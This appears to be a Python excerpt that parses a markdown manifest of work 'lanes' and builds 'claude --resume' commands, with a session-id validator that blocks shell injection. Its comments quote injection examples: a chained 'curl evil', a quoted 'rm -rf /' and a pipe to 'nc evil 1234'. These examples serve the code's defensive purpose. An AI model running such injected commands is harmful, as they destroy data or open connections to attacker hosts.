# A resume target is either a UUID or a session NAME - the manifest says so
# in its own notes, and five real rows use `claude --resume "zaostock"`.
# Both are plain tokens; what matters is the charset, not the length, and
# anything carrying a shell metacharacter is refused rather than sanitised,
# because sanitising invites the question of what got removed.
SESSION_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_-]{2,63}$")


def load_lanes():
    """Parked lanes from the vault manifest: | Lane | `worktree` | `cmd` |"""
    lanes = []
    try:
        for ln in open(MANIFEST):
            if not ln.startswith("|") or "---" in ln or "Worktree" in ln:
                continue
            cells = [c.strip() for c in ln.strip("|\n").split("|")]
            if len(cells) < 3:
                continue
            name = cells[0]
            wt = cells[1].strip("`").replace("~", os.path.expanduser("~"))
            m = cells[2]
            # The manifest is a markdown file every lane can write to, and
            # this command is handed to `orca terminal create --command`,
            # which runs it in a shell. Passing the file's text through
            # would make any lane that can append a row able to run anything
            # on this mac: `claude --resume abc; curl evil` parsed cleanly
            # before this check existed.
            #
            # So the session id is EXTRACTED and validated, and the command
            # is built here from a literal. Nothing from the file reaches a
            # shell.
            cmd, bad = "", ""
            if "claude --resume" not in m:
                bad = "no `claude --resume` in the row"
            else:
                rest = m.split("claude --resume", 1)[1].strip("` ")
                rest = rest.split("`")[0].split(" - ")[0].strip()
                # Session names are written quoted in the manifest. Strip
                # the quotes BEFORE validating, then validate - so a value
                # like "; rm -rf /" loses its quotes and still fails on the
                # charset rather than sneaking through as "quoted".
                rest = rest.strip().strip('"').strip("'").strip()
                parts = rest.split()
                if len(parts) > 1:
                    # Truncating to parts[0] would quietly turn
                    # `... a1b2c3d4 | nc evil 1234` into a working lane
                    # opener and say nothing about the tail it dropped. A row
                    # that carries more than a session id is malformed, and
                    # the row should hear about it.
                    bad = "row carries more than a session id: %r" % rest[:48]
                elif not SESSION_RE.match(parts[0] if parts else ""):
                    bad = "session id is not a plain token: %r" % (rest or "")[:40]
                else:
                    cmd = "claude --resume " + parts[0]
            if not os.path.isdir(wt):
                continue
            if name.startswith("-") or wt.startswith("-"):
                bad = bad or "name or worktree starts with a dash"
            lanes.append(dict(name=name, worktree=wt, cmd=cmd, bad=bad))
    except Exception:
        pass
    return lanes


